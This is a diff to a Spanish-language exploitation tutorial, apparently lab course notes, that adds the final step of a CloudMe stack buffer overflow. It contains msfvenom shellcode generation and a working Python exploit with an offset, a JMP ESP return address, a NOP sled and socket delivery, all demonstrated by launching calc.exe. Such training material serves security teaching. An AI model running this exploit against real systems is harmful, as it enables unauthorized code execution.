@@ -729,11 +729,47 @@ Como podemos observar, hay varias librerías cargadas por el programa sin protec
 Si no hubiéramos encontrado ningún resultado, podríamos buscar el `FFE4`patrón en todo el módulo o en todos los módulos, como se mostró en una sección anterior. También podemos buscar otras instrucciones útiles, como `54C3`. En nuestro caso, después de hacer doble clic en el primer resultado para asegurarnos de que efectivamente es `JMP ESP`, podemos copiar la dirección `0069D2E5`y usarla en nuestro exploit. (Intenta buscar otras instrucciones y úsalas como dirección de retorno).
 ### Saltar a Shellcode
 
-Nuestro paso final es explotar el programa, por lo que comenzaremos creando nuestro shellcode con el que `msfvenom`abriremos `calc.exe`como prueba de explotación exitosa:
+Nuestro paso final es explotar el programa, por lo que comenzaremos creando nuestro shellcode con el que `msfvenom` abriremos `calc.exe` como prueba de explotación exitosa:
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
+
+...SNIP...
+buf =  b""
+buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
+buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
+buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
+...SNIP...
+```
+
+Ahora, para crear nuestra función final `exploit()`, primero agregaremos la salida anterior y usaremos la misma `payload` de nuestro exploit anterior (mientras cambiamos `offset` la dirección en `eip`). Finalmente, usaremos el mismo código de `bad_chars()` para enviar nuestra carga útil al puerto:
+
+```python
+def exploit():
+    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
+    buf = b""
+    ...SNIP...
+    buf += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
+
+    offset = 1052
+    buffer = b"A"*offset
+    eip = pack('<L', 0x0069D2E5)
+    nop = b"\x90"*32
+    payload = buffer + eip + nop + buf
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+exploit()
+```
+
+Finalmente, podemos ejecutar `CloudMe` (no necesariamente en `x32dbg`) y ejecutar nuestro exploit, y deberíamos ver que se bloquea y debería abrirse una calculadora.
+## Explotación remota
 
 
 
-## Explotación a distancia
 
 
 # Referencias
